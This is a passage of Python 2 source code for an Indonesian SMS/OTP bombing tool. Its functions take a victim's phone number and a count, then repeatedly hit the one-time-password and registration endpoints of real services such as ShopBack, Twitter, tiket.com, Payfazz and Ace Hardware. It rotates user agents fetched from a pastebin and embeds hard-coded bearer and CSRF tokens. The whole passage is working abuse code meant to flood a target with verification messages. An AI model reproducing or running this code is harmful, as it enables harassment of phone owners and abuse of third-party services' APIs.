            d = r.post('https://www.shopback.co.id/account/sendOtp', headers={'accept': 'application/json', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'content-length': '115', 'content-type': 'application/x-www-form-urlencoded', 'http_x_requested_with': 'XMLHttpRequest', 'origin': 'https://www.shopback.co.id', 'referer': 'https://www.shopback.co.id/login?redirect=/referral/invite', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': '{acak}', 'x-requested-with': 'XMLHttpRequest'}, data={'phone': no, 'nice_try_token': c['value'], 'email': 'akasaka1@etlgr.com', 'target': 'signup'}).text
            if d == '{"verified":false}':
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                wait(30)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                wait(30)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    y = raw_input('\n\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        shp()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def pmn():
    logo()
    no = raw_input('\x1b[1;37m[\x1b[1;31m*\x1b[1;37m] \x1b[0;37mExample: 08XXX\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        pmn()
    jml = raw_input('\x1b[1;37m[\x1b[1;31m+\x1b[1;37m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        pmn()
    print
    data = {'operationName': 'LoginByPhone', 'variables': {'input': {'country_code': '+62', 'phone_number': no, 'platform': 'web'}}, 'query': 'mutation LoginByPhone($input: LoginByPhoneInput) {\n  LoginByPhone(input: $input) {\n    token\n    __typename\n  }\n}\n'}
    datajson = json.dumps(data)
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'content-length': '256', 'device-type': 'mobile-web', 'origin': 'https://web.pomona.id', 'source': 'mobile-web', 'user-agent': '{acak}', 'content-type': 'application/json', 'accept': '*/*', 'ip': '114.142.170.30', 'referer': 'https://web.pomona.id/masuk', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://api.pomona.id/graphql', headers=hd, data=datajson)
            if '"token":null,"' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(5)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                time.sleep(3)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    y = raw_input('\n\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        pmn()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def jet():
    logo()
    print 'Work jika nomor korban blom daftar JET'
    no = raw_input('\x1b[1;37m[\x1b[1;31m*\x1b[1;37m] \x1b[0;37mExample: 08XXX\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        prs()
    jml = raw_input('\x1b[1;37m[\x1b[1;31m+\x1b[1;37m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        prs()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'Connection': 'keep-alive', 'Content-Length': '127', 'Accept': '*/*', 'Origin': 'http://jet.id', 'X-Requested-With': 'XMLHttpRequest', 'Save-Data': 'on', 'User-Agent': '{acak}', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Referer': 'http://jet.id/Account/Register', 'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('http://jet.id/Account/register', headers=hd, data={'fullName': 'Yayakyk', 'email': 'yayakyk@40gmail.com', 'phoneNumber': no, 'address': 'Jakarta', 'password': 'qwerty123', 'confirmPassword': 'qwerty123'}).text
            print a
            wait(30)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    y = raw_input('\n\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        jet()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def tw():
    logo()
    no = raw_input('\x1b[1;37m[\x1b[1;31m*\x1b[1;37m] \x1b[0;37mExample: 08XXX\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        tw()
    jml = raw_input('\x1b[1;37m[\x1b[1;31m+\x1b[1;37m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        tw()
    print
    data = {'phone': no, 'use_voice': 'false', 'send_auto_verify_hash': 'false', 'flow_token': 'g;158355847049070709:-1583558508469:16afWpmiAuZzd9TbbmXzWWQ0:0'}
    datajson = json.dumps(data)
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'origin': 'https://mobile.twitter.com', 'x-twitter-client-language': 'en', 'x-csrf-token': '76aee95c7468a28309eed1b1c1f3df98', 'authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA', 'content-type': 'application/json', 'user-agent': '{acak}', 'x-guest-token': '1236159940089098240', 'x-twitter-active-user': 'yes', 'accept': ' */*', 'referer': 'https://mobile.twitter.com/i/flow/signup', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://api.twitter.com/1.1/onboarding/begin_verification.json', headers=hd, json=datajson).text
            print a
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    y = raw_input('\n\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        tw()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def jtk():
    no = raw_input('\x1b[1;37m[\x1b[1;31m*\x1b[1;37m] \x1b[0;37mExample: 8XXX\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        jtk()
    jml = raw_input('\x1b[1;37m[\x1b[1;31m+\x1b[1;37m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        jtk()
    print
    ur = requests.get('https://tjetak.com/register')
    parse = bs(ur.text, features='html.parser')
    token = parse.find('meta', {'name': 'csrf-token'})['content']
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'Host': 'www.tjetak.com', 'content-length': '22', 'accept': '*/*', 'origin': 'https://www.tjetak.com', 'user-agent': '{acak}', 'x-xsrf-token': 'eyJpdiI6IlVwN3JzZmhmMUdUZ3cxQUVzSDlNT2c9PSIsInZhbHVlIjoiSktFQk55enZGbkZFZWEwbTI0dkVTQXE2bFwvYzJYMGlnOU5yNzNQdTlRMmlFT1N3Yk5EU2t6eHIxQ1ZoZ2c4U1IiLCJtYWMiOiJhZjRhMTIxNDdlZjBjZjRjNTcxYjhlODU4NDU2OTg1OGNkZTc0ODliMGMxYWY3YzllOWFiMjQ1NGM1ZjI0NjhlIn0=', 'x-csrf-token': token, 'content-type': 'application/json;charset=UTF-8', 'accept': 'application/json, text/plain, */*', 'x-requested-with': 'XMLHttpRequest', 'save-data': 'on', 'referer': 'https://www.tjetak.com/register', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    a = r.post('https://www.tjetak.com/register/send', headers=hd, json={'phone': no}).text
    print a
    metu()


def sop():
    logo()
    no = raw_input('\x1b[1;37m[\x1b[1;31m*\x1b[1;37m] \x1b[0;37mExample: 08XXX\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        sop()
    jml = raw_input('\x1b[1;37m[\x1b[1;31m+\x1b[1;37m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        sop()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'Host': 'api.sooplai.com', 'content-length': '23', 'accept': 'application/json, text/plain, */*', 'origin': 'https://www.sooplai.com', 'user-agent': '{acak}', 'content-type': 'application/json', 'referer': 'https://www.sooplai.com/verify/sms?phone=' + no + '&register=true', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://api.sooplai.com/customer/register/otp/request', headers=hd, json={'phone': no})
            if '' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(5)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                time.sleep(3)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    y = raw_input('\n\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        sop()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def tkt():
    logo()
    no = raw_input('\x1b[1;37m[\x1b[1;31m*\x1b[1;37m] \x1b[0;37mExample: +628XXX\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        tkt()
    jml = raw_input('\x1b[1;37m[\x1b[1;31m+\x1b[1;37m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        tkt()
    print
    data = [{'operationName': 'postOtpGenerateV2', 'variables': {'recipient': no, 'requestType': 'REGISTER_OTP'}, 'query': 'mutation postOtpGenerateV2($recipient: String, $requestType: String, $ignoreRecipient: Boolean, $magicLinkAdditionalParameter: String, $fullName: String, $deviceId: String) {\n  otpGenerateV2(recipient: $recipient, requestType: $requestType, ignoreRecipient: $ignoreRecipient, magicLinkAdditionalParameter: $magicLinkAdditionalParameter, fullName: $fullName, deviceId: $deviceId) {\n    code\n    message\n    data {\n      exist\n      expired\n      maskedAccount\n      nextAvailableRequest\n      trxId\n      __typename\n    }\n    errors\n    __typename\n  }\n}\n'}]
    datajson = json.dumps(data)
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'origin': 'https://m.tiket.com', 'user-agent': '{acak}', 'content-type': 'application/json', 'referer': 'https://m.tiket.com/login/?ref=https%3A%2F%2Fm.tiket.com%2Fmyaccount', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://gql.tiket.com/', headers=hd, data=datajson)
            if 'SUCCESS' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                wait(30)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                wait(30)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    y = raw_input('\n\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        tkt()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def sek():
    no = raw_input('\x1b[1;37m[\x1b[1;31m*\x1b[1;37m] \x1b[0;37mExample: 8XXX\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        air()
    jml = raw_input('\x1b[1;37m[\x1b[1;31m+\x1b[1;37m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        air()
    print
    ur = requests.get('https://en.seekmi.com/register')
    parse = bs(ur.text, features='html.parser')
    token = parse.find('meta', {'name': 'csrf-token'})['content']
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'content-length': '29', 'origin': 'https://en.seekmi.com', 'x-csrf-token': token, 'user-agent': '{acak}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'accept': '*/*', 'x-requested-with': 'XMLHttpRequest', 'save-data': 'on', 'referer': 'https://en.seekmi.com/register', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    a = r.post('https://en.seekmi.com/ajax/send-otp', headers=hd, data={'phone': no, 'name': 'Bangsat'}).text
    print a
    metu()


def pfz():
    logo()
    no = raw_input('\x1b[1;37m[\x1b[1;31m*\x1b[1;37m] \x1b[0;37mExample: 08XXX\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        pfz()
    jml = raw_input('\x1b[1;37m[\x1b[1;31m+\x1b[1;37m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        pfz()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'Host': 'api.payfazz.com', 'content-length': '17', 'accept': '*/*', 'origin': 'https://www.payfazz.com', 'user-agent': '{acak}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'referer': 'https://www.payfazz.com/register/BEN6ZF74XL', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://api.payfazz.com/v2/phoneVerifications', headers=hd, data={'phone': no})
            if 'phoneVerificationId' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(5)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                time.sleep(5)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    y = raw_input('\n\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        pfz()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def rwk():
    logo()
    no = raw_input('\x1b[1;37m[\x1b[1;31m*\x1b[1;37m] \x1b[0;37mExample: +628XXX\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        rwk()
    jml = raw_input('\x1b[1;37m[\x1b[1;31m+\x1b[1;37m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        rwk()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'Connection': 'keep-alive', 'Content-Length': '77', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Origin': 'https://web.rework.id', 'X-Requested-With': 'XMLHttpRequest', 'Save-Data': 'on', 'User-Agent': '{acak}', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Referer': 'https://web.rework.id/register', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://web.rework.id/nexmo/sendCode', headers=hd, data={'_token': 'oZauPolVAhritYJwD3UNINtQTeBUGcTDwKZkS8EM', 'mobile_phone': no})
            if 'succeed' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(5)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                time.sleep(5)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    y = raw_input('\n\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        rwk()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def dmt():
    no = raw_input('\x1b[1;37m[\x1b[1;31m*\x1b[1;37m] \x1b[0;37mExample: 8XXX\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        air()
    jml = raw_input('\x1b[1;37m[\x1b[1;31m+\x1b[1;37m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        air()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'Connection': 'keep-alive', 'Content-Length': '97', 'Accept': '*/*', 'Origin': 'https://domaten.com', 'X-Requested-With': 'XMLHttpRequest', 'Save-Data': 'on', 'User-Agent': '{acak}', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Referer': 'https://domaten.com/signup/', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    a = r.post('https://domaten.com/wp-admin/admin-ajax.php', headers=hd, data={'action': 'ihs_otp_ajax_hook', 'security': '301afb711c', 'data[phone]': no, 'data[country_code]': '62'}).text
    print a
    metu()


def qcr():
    logo()
    no = raw_input('\x1b[1;37m[\x1b[1;31m*\x1b[1;37m] \x1b[0;37mExample: 8XXX\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        qcr()
    jml = raw_input('\x1b[1;37m[\x1b[1;31m+\x1b[1;37m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        qcr()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'content-length': '36', 'accept': '*/*', 'origin': 'https://www.qikcircle.com', 'x-requested-with': 'XMLHttpRequest', 'save-data': 'on', 'user-agent': '{acak}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'referer': 'https://www.qikcircle.com/Register', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://www.qikcircle.com/SendSmsOtp', headers=hd, data={'countryCode': '+62', 'phoneNo': no})
            if 'OTP Sent' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(5)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                time.sleep(5)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    y = raw_input('\n\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        qcr()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def bos():
    logo()
    no = raw_input('\x1b[1;37m[\x1b[1;31m*\x1b[1;37m] \x1b[0;37mExample: 628XXX\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        bos()
    jml = raw_input('\x1b[1;37m[\x1b[1;31m+\x1b[1;37m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        bos()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'Connection': 'keep-alive', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'X-Requested-With': 'XMLHttpRequest', 'Save-Data': 'on', 'user-agent': '{acak}', 'referer': 'https://bos.smartlink.id/register', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.get('https://bos.smartlink.id/getOTPRegister/' + no + '/wa', headers=hd)
            if 'success' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                wait(120)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                wait(120)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    y = raw_input('\n\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        bos()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def ace():
    logo()
    no = raw_input('\x1b[1;37m[\x1b[1;31m*\x1b[1;37m] \x1b[0;37mExample: 8XXX\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        ace()
    jml = raw_input('\x1b[1;37m[\x1b[1;31m+\x1b[1;37m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        ace()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'Accept': '*/*', 'X-Requested-With': 'XMLHttpRequest', 'Save-Data': 'on', 'user-agent': '{acak}', 'referer': 'https://www.acehardware.co.id/membership/register', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.get('https://www.acehardware.co.id/membership/send-otp?cellphone=' + no + '&otp_type=register', headers=hd)
            if 'Silahkan mencoba lagi besok' in a.text:
                print '%s[%s%s%s] %sLimit 1 hari, coba lago besok%s' % (W1, R1, z, W1, W0, no)
                time.sleep(1)
            else:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(5)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    y = raw_input('\n\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        ace()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def bkm():
    logo()
    no = raw_input('\x1b[1;37m[\x1b[1;31m*\x1b[1;37m] \x1b[0;37mExample: 628XXX\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        bkm()
    jml = raw_input('\x1b[1;37m[\x1b[1;31m+\x1b[1;37m] \x1b[0;37mJumlah: ')
    if jml == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        bkm()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'content-length': '27', 'accept': '*/*', 'origin': 'https://nabil.my.id', 'x-requested-with': 'XMLHttpRequest', 'user-agent': '{acak}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'referer': 'https://nabil.my.id/Bakmi_Otp', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://nabil.my.id/Tools/Prank-Tools/Bakmi/api.php', headers=hd, data={'nomor': no, 'jumlah': '1'})
            if 'Terkirim' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s' % (W1, G1, z, W1, W0, no)
                time.sleep(5)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s' % (W1, R1, z, W1, W0, no)
                time.sleep(3)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    y = raw_input('\n\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        bkm()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def rp():
    logo()
    no = raw_input('\x1b[1;37m[\x1b[1;31m*\x1b[1;37m] \x1b[0;37mExample: 08XXX\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        rp()
    print
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    dt = {'mobile': no, 'noise': '1583590641573155574', 'request_time': '158359064157312', 'access_token': '11111'}
    data = json.dumps(dt)
    r = requests.Session()
    for spam in range(3):
        try:
            a = r.post('https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code', headers={'accept': 'text/html, application/xhtml+xml, application/json, */*', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'content-length': '166', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://h5.rupiahcepatweb.com', 'referer': 'https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': '{acak}'}, data={'data': data}).text
            b = json.loads(a)['code']
            if b == 0:
                print '%s[%s*%s] %sSukses spam ke %s' % (W1, G1, W1, W0, no)
                wait(60)
            else:
                print '%s[%s*%s] %sGagal spam ke %s' % (W1, R1, W1, W0, no)
                wait(60)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi -_-' % (W1, R1, W1, R0)
            metu()

    y = raw_input('\n\x1b[1;37m[\x1b[1;31m!\x1b[1;37m] \x1b[0;37mLagi ? (y/n): ')
    if y == 'y' or y == 'Y':
        rp()
    elif y == 'n' or y == 'N':
        main2()
    else:
        main2()


def kk():
    logo()
    no = raw_input('\x1b[1;37m[\x1b[1;31m*\x1b[1;37m] \x1b[0;37mExample: 8XXX\n\x1b[1;37m[\x1b[1;32m!\x1b[1;37m]\x1b[0;37m Masukkan Nomor: ')
    if no == '':
        print '%s[%s!%s] %sJangan kosong cok' % (W1, R1, W1, W0)
        time.sleep(0.8)
        kk()
    print '%s[%s*%s] %sBro mohon maap spam nya manual ' % (W1, G1, W1, W0)
    time.sleep(3)
